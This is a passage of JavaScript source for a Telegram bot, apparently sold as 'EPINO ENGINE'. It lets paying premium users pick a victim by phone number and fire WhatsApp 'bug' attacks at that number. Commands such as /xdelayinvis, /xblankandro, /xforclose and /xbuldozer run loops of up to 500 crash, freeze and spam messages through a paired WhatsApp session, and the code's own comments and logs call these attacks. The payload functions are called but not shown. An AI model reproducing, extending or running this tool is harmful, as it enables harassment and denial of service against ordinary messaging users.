    { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫 𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "ownermenu", style: 'Success', icon_custom_emoji_id: "5296253249349762405" }
  ],
  [
    { text: "𝐂͢𝐡͡𝐚͜𝐧͢𝐧͡𝐞͜𝐥", url: "https://t.me/infoepin", style: 'Danger', icon_custom_emoji_id: "5228737694896502547" },
    { text: "𝐓͢𝐡͡𝐚͜𝐧͢𝐤⍣᳟𝐬꙳͙͡", callback_data: "thanksto", icon_custom_emoji_id: "5242409048246071737", style: "primary" },
    { text: "𝐃͢𝐞͡𝐯͜𝐞͢𝐥͡𝐨͜𝐩͢𝐞͡𝐫", url: "https://t.me/epindev", style: 'Danger', icon_custom_emoji_id: "5228737694896502547" }
  ]
  ];
  }

  try {
    await bot.editMessageMedia({
      type: "photo",
      media: randomImage,
      caption: newCaption,
      parse_mode: "HTML"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: {
        inline_keyboard: newButtons
      }
    });
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Sudah di menu ini.", show_alert: false });
    } else {
      console.error("Gagal edit media:", err);
    }
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

// ======= ( Parameter ) ======= \\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
// PEMANGGILAN FUNCTION DELAY DI SINI
async function delayengine(target) {
    for (let i = 0; i < 50; i++) {
    await epinodelay(sock, target);
    await sleep(1000);
    console.log(chalk.yellow(`DELAY INVISIBLE`));
    }
    }
// PEMANGGILAN FUNCTION BLANK DI SINI
async function blankengine(target) {
    for (let i = 0; i < 5; i++) {
    await epinoblank(sock, target);
    await epinodelay(sock, target);
    await sleep(1000);
    console.log(chalk.yellow(`BLANK ANDRO`));
    }
    }
    // PEMANGGILAN FUNCTION BULDO DI SINI
async function buldoengine(target) {
    for (let i = 0; i < 500; i++) {
    await epinobuldo(target);
    await sleep(500);
    console.log(chalk.yellow(`BULDOZER`));
    }
    }
 // PEMANGGILAN FUNCTION BULDOZER DI SINI   
async function dozerrbul(target) {
    for (let i = 0; i < 200; i++) {
    await NanasDelayBulldo(sock, target);
    await NanasDelayBulldo(sock, target);
    await sleep(1500)
    console.log(chalk.red("Dozer Attack"));
   }
   }
   // PEMANGGILAN FUNCTION DELAY SPAM DI SINI   
async function spamsystem(target) {
    for (let i = 0; i < 80; i++) {
    await AmbaDelayBanget(sock, target);
    await AmbaDelayBanget(sock, target);
    await AmbaDelayBanget(sock, target);
    await sleep(1000)
    console.log(chalk.red(" Delay Spam Attack"));
   }
   }
   // PEMANGGILAN FUNCTION HD DI SINI   
async function harddelayy(target) {
    for (let i = 0; i < 80; i++) {
    await NanasDelaySpam(sock, target);
    await NanasDelaySpam(sock, target);
    await sleep(1000)
    console.log(chalk.red("Hard delay Attack"));
   }
   }
   // PEMANGGILAN FUNCTION FC DI SINI   
async function fcengine(target) {
    for (let i = 0; i < 5; i++) {
    await epinofc(sock, target);
    await epinodelay(sock, target);
    await sleep(1000)
    console.log(chalk.red("FORCLOSE CLICK"));
   }
   }
//// =====( CASE BUG 1 ) ===== \\\\
bot.onText(/\/xdelayinvis (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/epindev" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpairing terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xdelayinvis
〄 Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xdelayinvis
〄 Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await delayengine(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xdelayinvis
〄 Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//CASE 2
bot.onText(/\/Hardinfinity (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/epindev" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpairing terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Hardinfinity
〄 Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Hardinfinity
〄 Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await harddelayy(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Hardinfinity
〄 Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//CASE 3
bot.onText(/\/Xdozerr (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/epindev" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpairing terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Xdozerr
〄 Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Xdozerr
〄 Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await dozerrbul(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Xdozerr
〄 Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//Case delay Hard
bot.onText(/\/Xspamxx (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/epindev" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpairing terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Xspamxx
〄 Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Xspamxx
〄 Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await spamsystem(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /Xspamxx
〄 Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//BLANK
bot.onText(/\/xblankandro (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/epindev" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpairing terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xblankandro
〄 Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xblankandro
〄 Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await blankengine(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xblankandro
〄 Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//xbuldozer
bot.onText(/\/xbuldozer (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/epindev" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpairing terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xbuldozer
〄 Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xbuldozer
〄 Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await buldoengine(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xbuldozer
〄 Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//xbuldozer
bot.onText(/\/xforclose (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/epindev" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpairing terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xforclose
〄 Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xforclose
〄 Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await fcengine(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
〄 Target: ${formattedNumber}
〄 Type: /xforclose
〄 Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘊𝘦𝘬 ☇ 𝘛𝘢𝘳𝘨𝘦𝘵", url: `https://wa.me/${formattedNumber}`, style: 'Success' }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
///======( Plugin ) ======\\\
bot.onText(/\/xpairing (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
       return bot.sendMessage(
       chatId,
 `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
       { parse_mode: "Markdown" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in addbot:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
      
bot.onText(/^\/gconly (on|off)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
      if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });
      
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);

     bot.sendMessage(chatId, response); });

const moment = require('moment');
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
✅Berhasil, kini user ${userId} Sudah memiliki akses premium hingga ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });

bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);

        { parse_mode: "Markdown" }
   
        }

      if (!match || !match[1]) 
